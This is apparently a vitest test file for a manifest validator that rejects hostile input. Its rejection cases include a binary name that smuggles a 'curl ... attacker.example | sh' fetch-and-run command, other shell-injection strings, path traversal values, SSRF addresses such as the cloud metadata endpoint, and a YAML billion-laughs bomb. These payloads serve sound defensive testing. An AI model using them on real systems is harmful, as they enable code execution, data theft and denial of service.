import { describe, expect, it } from "vitest";
import {
  issuerUrlProblem,
  isSafeIssuerUrl,
  MAX_MANIFEST_BYTES,
  MAX_MANIFEST_DEPTH,
  parseManifest,
  validateManifestDocuments,
} from "./index.js";

const PRODUCT = { slug: "acme", name: "Acme" };

const release = (access?: unknown): Record<string, unknown> => ({
  release: {
    ghOwner: "acme",
    ghRepo: "desktop",
    binaryName: "acme",
    ...(access === undefined ? {} : { access }),
  },
});

function catalogWithSecretDelivery(
  delivery?: unknown,
): Record<string, unknown> {
  return {
    schemaVersion: 1,
    entries: [
      {
        key: "api.token",
        kind: "secret",
        secret: true,
        category: "Secrets",
        label: "API token",
        description: "Token delivered according to the manifest policy.",
        schema: { type: "string", minLength: 1 },
        ...(delivery === undefined ? {} : { delivery }),
      },
    ],
  };
}

describe("manifest contract defaults", () => {
  it("defaults release access to public metadata and public artifacts", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(release()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.access).toEqual({
      metadata: "public",
      artifacts: "public",
    });
  });

  it("preserves explicit release access values", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(
        release({ metadata: "authenticated", artifacts: "licensed" }),
      ),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.release?.access).toEqual({
      metadata: "authenticated",
      artifacts: "licensed",
    });
  });

  it("rejects unknown release access values", () => {
    const res = parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify(
        release({ metadata: "public", artifacts: "entitled" }),
      ),
    });

    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain(
      "release.access values must be public, authenticated, or licensed.",
    );
  });
});

describe("release string character classes (R6-01, R6-07)", () => {
  const parse = (releaseOver: Record<string, unknown>) =>
    parseManifest({
      product: JSON.stringify(PRODUCT),
      schema: JSON.stringify(catalogWithSecretDelivery()),
      release: JSON.stringify({
        release: {
          ghOwner: "acme",
          ghRepo: "desktop",
          binaryName: "acme",
          ...releaseOver,
        },
      }),
    });

  it("rejects a binaryName carrying shell metacharacters", () => {
    for (const binaryName of [
      "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
      'acme"; id > /tmp/pwned; :"',
      "acme`id`",
      "acme$(id)",
      "acme'; id; '",
      "-acme",
      "a".repeat(65),
    ]) {
      const res = parse({ binaryName });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain("release.binaryName must match");
    }
  });

  it("accepts a conventional binaryName", () => {
    for (const binaryName of ["acme", "acme-cli", "acme_cli", "Acme.2"]) {
      expect(parse({ binaryName }).ok).toBe(true);
    }
  });

  it("rejects dot-segment / query smuggling in channelWorkflow", () => {
    for (const channelWorkflow of [
      "../../../../../orgs/attacker-org/repos#",
      "wf.yml/runs?actor=evil&",
      "channel.txt",
    ]) {
      const res = parse({ channelWorkflow });
      expect(res.ok).toBe(false);
      if (res.ok) return;
      expect(res.errors.join("\n")).toContain("release.channelWorkflow");
    }
    expect(parse({ channelWorkflow: "channel.yml" }).ok).toBe(true);
    expect(parse({ channelWorkflow: "channel.yaml" }).ok).toBe(true);
    expect(parse({ channelWorkflow: "12345678" }).ok).toBe(true);
  });

  it("bounds ghOwner / ghRepo / betaBranch / summaryMarker / sparkleEd25519Pub", () => {
    expect(parse({ ghOwner: "acme/../victim" }).ok).toBe(false);
    expect(parse({ ghRepo: "desktop?x=1" }).ok).toBe(false);
    expect(parse({ betaBranch: "main&injected=1" }).ok).toBe(false);
    expect(parse({ summaryMarker: "a".repeat(200) }).ok).toBe(false);
    expect(parse({ sparkleEd25519Pub: "not a key!" }).ok).toBe(false);
    expect(parse({ sparkleEd25519Pub: "PUBKEY==" }).ok).toBe(true);
  });

  it("drops requireSparkleSignature: a repo cannot disable the platform's own control", () => {
    const res = parse({
      artifactPolicy: { requireSparkleSignature: false, requireDmg: true },
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(JSON.stringify(res.manifest.release?.artifactPolicy)).not.toContain(
      "requireSparkleSignature",
    );
    expect(res.manifest.release?.artifactPolicy?.requireDmg).toBe(true);
  });
});

describe("OIDC provider validation", () => {
  it("defaults missing oidc.provider to platform", () => {
    const res = parseManifest({
      product: JSON.stringify({
        ...PRODUCT,
        oidc: { groupRoleMap: {} },
      }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.oidc?.provider).toBe("platform");
    expect(res.manifest.oidc?.issuer).toBe("");
    expect(res.manifest.oidc?.clientId).toBe("");
  });

  it("accepts platform OIDC without product issuer/client credentials", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "platform", groupRoleMap: {} },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(true);
  });

  it("does not require a product client secret for platform OIDC", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: {
          provider: "platform",
          clientSecretSecret: "OIDC_CLIENT_SECRET",
        },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(true);
    expect(res.requiredSecrets).not.toContain("OIDC_CLIENT_SECRET");
  });

  it("requires custom OIDC issuer and clientId", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "custom" },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(false);
    expect(res.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: "invalid_oidc_issuer" }),
        expect.objectContaining({ code: "missing_oidc_client_id" }),
      ]),
    );
  });

  it("accepts a complete custom OIDC provider", () => {
    const res = parseManifest({
      product: JSON.stringify({
        ...PRODUCT,
        oidc: {
          provider: "custom",
          issuer: "https://id.example.test",
          clientId: "acme",
          clientSecretRef: "OIDC_CLIENT_SECRET",
          redirectUris: ["https://key.example.test/acme/auth/callback"],
          groupRoleMap: { users: { tier: "standard" } },
        },
      }),
      schema: JSON.stringify(catalogWithSecretDelivery()),
    });

    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.manifest.oidc?.provider).toBe("custom");
    expect(res.manifest.oidc?.issuer).toBe("https://id.example.test");
  });

  it("rejects unknown oidc.provider values", () => {
    const res = validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "legacy" },
      },
      schema: catalogWithSecretDelivery(),
    });

    expect(res.ok).toBe(false);
    expect(res.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: "invalid_oidc_provider" }),
      ]),
    );
  });
});

describe("secret delivery validation", () => {
  it.each(["serverOnly", "clientScoped", "edgeMint"] as const)(
    "accepts %s delivery for secret entries",
    (delivery) => {
      const result = validateManifestDocuments({
        product: PRODUCT,
        schema: catalogWithSecretDelivery(delivery),
      });

      expect(result.ok).toBe(true);
    },
  );

  it("rejects unknown secret delivery values", () => {
    const result = validateManifestDocuments({
      product: PRODUCT,
      schema: catalogWithSecretDelivery("browserGlobal"),
    });

    expect(result.ok).toBe(false);
    expect(result.errors).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          file: "schema",
          code: "invalid_catalog_shape",
          message: expect.stringContaining("delivery must be serverOnly"),
        }),
      ]),
    );
  });
});

describe("OIDC issuer safety (R9-01)", () => {
  const withIssuer = (issuer: unknown) =>
    validateManifestDocuments({
      product: {
        ...PRODUCT,
        oidc: { provider: "custom", issuer, clientId: "acme" },
      },
      schema: catalogWithSecretDelivery(),
    });

  it("rejects plain http, non-http schemes, credentials, and a query/fragment", () => {
    for (const issuer of [
      "http://id.example",
      "ftp://id.example",
      "javascript:alert(1)",
      "not a url",
      "",
      "https://user:pw@id.example",
      "https://id.example/?next=https://evil.example",
      "https://id.example/#x",
      `https://id.example/${"a".repeat(4000)}`,
    ]) {
      expect(withIssuer(issuer).ok, String(issuer)).toBe(false);
      expect(isSafeIssuerUrl(issuer), String(issuer)).toBe(false);
    }
  });

  it("rejects every private / loopback / link-local / reserved address literal notation", () => {
    for (const issuer of [
      "https://169.254.169.254/", // cloud metadata
      "http://169.254.169.254/latest/meta-data",
      "https://10.1.2.3/",
      "https://172.16.0.1/",
      "https://172.31.255.254/",
      "https://192.168.0.1/",
      "https://192.0.0.1/",
      "https://198.18.0.1/",
      "https://100.64.0.1/",
      "https://127.0.0.2/",
      "https://0.0.0.0/",
      "https://224.0.0.1/",
      "https://255.255.255.255/",
      "https://[fd00::1]/",
      "https://[fc00::1]/",
      "https://[fe80::1]/",
      "https://[ff02::1]/",
      "https://[::]/",
      "https://[::ffff:169.254.169.254]/", // IPv4-mapped
      "https://[::ffff:a9fe:a9fe]/", // the same address, hex hextets
      "https://[0:0:0:0:0:0:a9fe:a9fe]/", // IPv4-compatible (deprecated)
      "https://[::ffff:10.0.0.1]/",
    ]) {
      expect(isSafeIssuerUrl(issuer), issuer).toBe(false);
      expect(issuerUrlProblem(issuer), issuer).toMatch(
        /private, loopback, link-local|https/,
      );
    }
  });

  it("accepts a real IdP and the loopback dev carve-out", () => {
    for (const issuer of [
      "https://id.example.test",
      "https://id.example.test/oidc/v1",
      "https://8.8.8.8/", // a public address literal is not reserved
      "https://[2606:4700::1]/",
      "http://localhost:8788",
      "http://127.0.0.1:8788",
      "http://[::1]:8788",
      "https://localhost:8443",
      "https://2130706433/", // 127.0.0.1 written as a decimal integer
    ]) {
      expect(issuerUrlProblem(issuer), issuer).toBeNull();
      expect(withIssuer(issuer).ok, issuer).toBe(true);
    }
  });

  it("bounds redirect URIs (count, length, credentials)", () => {
    const oidc = (redirectUris: unknown) =>
      validateManifestDocuments({
        product: {
          ...PRODUCT,
          oidc: {
            provider: "custom",
            issuer: "https://id.example.test",
            clientId: "acme",
            redirectUris,
          },
        },
        schema: catalogWithSecretDelivery(),
      });
    expect(oidc(["https://user:pw@key.example/cb"]).ok).toBe(false);
    expect(oidc([`https://key.example/${"a".repeat(4000)}`]).ok).toBe(false);
    expect(
      oidc(Array.from({ length: 21 }, (_, i) => `https://key.example/${i}`)).ok,
    ).toBe(false);
    // Loopback redirect URIs stay legal: native/desktop apps genuinely use them.
    expect(oidc(["http://127.0.0.1:53123/callback"]).ok).toBe(true);
  });
});

describe("manifest document limits (R7-02)", () => {
  const validProduct = JSON.stringify(PRODUCT);
  const validSchema = JSON.stringify(catalogWithSecretDelivery());

  it("refuses a document over the byte cap before parsing it", () => {
    // The R7-02 PoC shape: a flat YAML map whose key count drives a quadratic parse.
    let yaml = "slug: acme\nname: Acme\n";
    for (let i = 0; yaml.length < MAX_MANIFEST_BYTES * 2; i++) {
      yaml += `k${i}: ${"v".repeat(10)}\n`;
    }
    const started = Date.now();
    const res = parseManifest({ schema: validSchema, product: yaml });
    const elapsed = Date.now() - started;

    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain(
      `${MAX_MANIFEST_BYTES}-byte .pkey/ document limit`,
    );
    // The point of the cap is that the rejection is O(1), not "parse it then complain".
    expect(elapsed).toBeLessThan(1000);
  });

  it("counts UTF-8 bytes, not UTF-16 code units", () => {
    // Just under the cap in code units, well over it in bytes.
    const wide = `name: "${"一".repeat(MAX_MANIFEST_BYTES - 100)}"\nslug: acme\n`;
    expect(wide.length).toBeLessThan(MAX_MANIFEST_BYTES);
    const res = parseManifest({ schema: validSchema, product: wide });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.join("\n")).toContain("document limit");
  });

  it("parses a large-but-legal YAML manifest quickly (uniqueKeys is off)", () => {
    let yaml = "slug: acme\nname: Acme\n";
    for (let i = 0; yaml.length < MAX_MANIFEST_BYTES - 4096; i++) {
      yaml += `k${i}: ${"v".repeat(10)}\n`;
    }
    const started = Date.now();
    const res = parseManifest({ schema: validSchema, product: yaml });
    expect(Date.now() - started).toBeLessThan(1000);
    expect(res.ok).toBe(true);
  });

  it("refuses a document nested past the depth cap, in JSON and in YAML", () => {
    const deep = (n: number): string => "[".repeat(n) + "]".repeat(n);
    const json = `{"slug":"acme","name":"Acme","x":${deep(MAX_MANIFEST_DEPTH + 5)}}`;
    const jsonRes = parseManifest({ schema: validSchema, product: json });
    expect(jsonRes.ok).toBe(false);
    if (!jsonRes.ok) {
      expect(jsonRes.errors.join("\n")).toContain("nested deeper than");
    }

    const yaml = `slug: acme\nname: Acme\nx: ${deep(MAX_MANIFEST_DEPTH + 5)}\n`;
    const yamlRes = parseManifest({ schema: validSchema, product: yaml });
    expect(yamlRes.ok).toBe(false);
    if (!yamlRes.ok) {
      expect(yamlRes.errors.join("\n")).toContain("nested deeper than");
    }

    // A profile payload nested within the cap is still fine.
    expect(
      parseManifest({
        schema: validSchema,
        product: `{"slug":"acme","name":"Acme","x":${deep(8)}}`,
      }).ok,
    ).toBe(true);
  });

  it("bounds YAML alias expansion (billion laughs)", () => {
    const bomb = [
      "slug: acme",
      "name: Acme",
      "a: &a [x, x, x, x, x, x, x, x, x]",
      "b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]",
      "c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]",
      "d: [*c, *c, *c, *c, *c, *c, *c, *c, *c]",
      "",
    ].join("\n");
    const res = parseManifest({ schema: validSchema, product: bomb });
    expect(res.ok).toBe(false);
  });

  it("still parses the ordinary JSON and YAML manifests it always did", () => {
    expect(
      parseManifest({ schema: validSchema, product: validProduct }).ok,
    ).toBe(true);
    expect(
      parseManifest({
        schema: validSchema,
        product: "slug: acme\nname: Acme\n",
      }).ok,
    ).toBe(true);
  });
});

describe("manifest identifier character classes (R9-01 audit)", () => {
  const product = (over: Record<string, unknown>) =>
    validateManifestDocuments({
      product: { ...PRODUCT, ...over },
      schema: catalogWithSecretDelivery(),
    });

  it("bounds slug, name, and adminGroup", () => {
    expect(product({ slug: "a".repeat(65) }).ok).toBe(false);
    expect(product({ name: "a".repeat(201) }).ok).toBe(false);
    expect(product({ name: "Acme\nX-Injected: 1" }).ok).toBe(false);
    expect(product({ adminGroup: "admins; drop" }).ok).toBe(false);
    expect(product({ adminGroup: "corp/admins" }).ok).toBe(true);
  });

  it("constrains provisioning claim / entitlementKey / secretUrlTemplate / allowedHosts", () => {
    const hook = (over: Record<string, unknown>) =>
      product({
        provisioning: [{ claim: "vpnAccess", ...over }],
      });
    // A claim name is a property lookup on the decoded ID token.
    expect(product({ provisioning: [{ claim: "__proto__" }] }).ok).toBe(false);
    expect(product({ provisioning: [{ claim: "constructor" }] }).ok).toBe(
      false,
    );
    expect(hook({ entitlementKey: "a b" }).ok).toBe(false);
    // The template is handed to the client as a secret; the host must be fixed at ingest, and
    // `allowedHosts: [""]` must not be able to wave through a non-http scheme.
    expect(
      hook({ secretKey: "vpn.url", secretUrlTemplate: "javascript:alert(1)" })
        .ok,
    ).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "http://vpn.example/{claim}",
      }).ok,
    ).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "https://{claim}.evil.example/",
      }).ok,
    ).toBe(false);
    expect(hook({ allowedHosts: [""] }).ok).toBe(false);
    expect(
      hook({
        secretKey: "vpn.url",
        secretUrlTemplate: "https://vpn.example/{claim}",
        allowedHosts: ["vpn.example"],
      }).ok,
    ).toBe(true);
  });

  it("constrains edgeMint id / kid, tier channels and version bounds, and probe declarations", () => {
    const withRelease = (edgeMint: unknown) =>
      validateManifestDocuments({
        product: PRODUCT,
        schema: catalogWithSecretDelivery(),
        release: { ghOwner: "acme", ghRepo: "desktop", edgeMint },
      });
    const recipe = (over: Record<string, unknown>) => ({
      id: "musickit",
      alg: "ES256",
      signingKeySecret: "MINT_KEY",
      ...over,
    });
    // The id is a URL path segment on /<product>/mint/<id>/auth.
    expect(withRelease([recipe({ id: "../../admin" })]).ok).toBe(false);
    expect(withRelease([recipe({ kid: 'x"' })]).ok).toBe(false);
    expect(withRelease([recipe({ audience: "a".repeat(201) })]).ok).toBe(false);
    expect(withRelease([recipe({})]).ok).toBe(true);

    expect(product({ tiers: [{ id: "t", channels: ["../beta"] }] }).ok).toBe(
      false,
    );
    expect(product({ tiers: [{ id: "t", minVersion: "latest" }] }).ok).toBe(
      false,
    );
    expect(
      product({ tiers: [{ id: "t", channels: ["beta"], minVersion: "1.2.3" }] })
        .ok,
    ).toBe(true);

    expect(
      product({ fingerprint: { probes: [{ id: "has app", macos: "/A.app" }] } })
        .ok,
    ).toBe(false);
    expect(
      product({
        fingerprint: {
          probes: [{ id: "hasApp", macos: "/Applications/A.app" }],
        },
      }).ok,
    ).toBe(true);
    expect(product({ autoIssue: { enabled: true, tierId: "a b" } }).ok).toBe(
      false,
    );
  });
});
